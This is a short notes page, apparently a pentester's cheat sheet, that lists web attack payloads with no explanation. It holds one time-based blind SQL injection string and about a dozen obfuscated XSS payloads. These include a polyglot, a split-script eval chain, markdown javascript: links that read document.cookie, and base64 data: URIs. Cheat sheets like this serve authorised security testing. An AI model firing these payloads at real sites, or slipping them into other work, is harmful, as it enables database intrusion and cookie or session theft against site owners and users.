---
title: 11-Payloads
draft: false
tags:
  - xss
  - sqli
---
## SQLi Payloads

```
0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
```

## XSS Payloads

- https://tinyxss.terjanq.me/

```
1'"<S><A HRef=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt; Title=tel:/*%26apos;;/*%26quot;;/*%26lt;s%26gt;%26lt;Img/Src/*/O%26%2378;Error=alert(1)//%26gt;>

<​script>a="import\x28"<​/script> <​script>b="`//0-a\x2e"<​/script> <​script>c="nl`\x29"<​/script><​script>d=setTimeout<​/script><​script>e=eval<​/script><​script>f=`${a}${b}${c}`<​/script><​script>d`e\x28f\x29`<​/script>

[a](javascript​:prompt(document.cookie))  
[a](j a v a s c r i p t:prompt(document.cookie))  
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74​&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>  
![a'"`onerror=prompt(document.cookie)](x)  
[notmalicious](javascript​:window.onerror=alert;throw%20document.cookie)  
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)  
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click

"onclick​=prompt(8)>"@x.y
```

